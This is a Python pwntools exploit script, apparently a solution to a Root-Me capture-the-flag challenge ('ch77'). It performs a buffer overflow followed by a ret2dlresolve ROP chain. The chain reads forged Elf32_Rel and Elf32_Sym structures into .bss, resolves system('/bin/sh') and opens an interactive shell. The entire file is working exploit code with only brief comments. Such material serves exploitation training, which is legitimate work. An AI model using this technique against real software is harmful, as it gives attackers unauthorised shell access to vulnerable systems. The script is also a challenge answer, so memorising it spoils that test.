from pwn import *
from struct import *

context.log_level = 'debug'
elf = ELF('./ch77')

OFFSET = 28

# get section address
BSS             = elf.get_section_by_name('.bss').header['sh_addr']
STAGE2_ADDR = BSS+20
PLT = DL_RESOLVE = elf.get_section_by_name('.plt').header['sh_addr'] #dl = plt[0]
STRTAB = elf.get_section_by_name('.dynstr').header['sh_addr']
SYMTAB = elf.get_section_by_name('.dynsym').header['sh_addr']
JMPREL = elf.get_section_by_name('.rel.plt').header['sh_addr'] # rel.plt

log.info('Section Headers')
log.info("BSS:         " + hex(BSS))
log.info("PLT:         " + hex(PLT))
log.info("STAGE2_ADDR: " + hex(STAGE2_ADDR))
log.info("STRTAB:      " + hex(STRTAB))
log.info("SYMTAB:      " + hex(SYMTAB))
log.info("JMPREL:      " + hex(JMPREL))
log.info("READ:        " + hex(elf.plt["read"]))

# Gadget

GADGET_POP3RET = 0x080484b9 # pop esi, pop edi, pop ebp, ret

binary = ELF(elf.path)
p = process(binary.path)
#p = remote('challenge03.root-me.org', 56577)

## STAGE 1 - READ ROP

reloc_offset = BSS - JMPREL# our fake offset to our fake rel.plt struct
binsh_addr = BSS + 12 + 16 + 8

stage1 = b'A' * OFFSET
# call read(stdin, bss, 0x64)
stage1 += p32(elf.plt["read"])  # read offset int the .plt section
stage1 += p32(GADGET_POP3RET)   # Pop read arg and ret to PLT[0] -> resolver
stage1 += p32(0)                # stdin
stage1 += p32(BSS)              # buffer
stage1 += p32(0x64)             # length
# call plt[0] = system("/bin/sh")
stage1 += p32(PLT)              # ret2PLT (call system function)
stage1 += p32(reloc_offset)     # JMPREL + reloc_offset points to BSS (fake Elf32_Rel struct)
stage1 += p32(0xdeadbeef)           # return pointer after resolution
stage1 += p32(binsh_addr)       # arg for system function
# print(''.join(['\\x{:02x}'.format(ord(byte)) for byte in stage1]))
p.send(stage1)

# STAGE 2: Set up forge area in BSS section

dynsym_idx = ((BSS + (0x4 * 3)) - SYMTAB) // 0x10 # index to the Elf32_Sym which is store in BSS + 12
r_info = (dynsym_idx << 8) | 0x7
dynstr_offset = (BSS + (0x4 * 7)) - STRTAB
print("dynstr_offset = ", dynstr_offset)
print("dynsym_idx = ", dynsym_idx)

#Fake Elf32_Rel
stage2 = p32(elf.got['read']) # after resolving symbol write the actual address of function
stage2 += p32(r_info)
#Fake Elf32_Sym
stage2 += p32(0) #padding
stage2 += p32(dynstr_offset)
stage2 += p32(0) * 3
#Strings
stage2 += b'system\x00\x00'
stage2 += b'/bin/sh\x00'
# print(''.join(['\\x{:02x}'.format(ord(byte)) for byte in stage2]))
p.send(stage2)

p.interactive()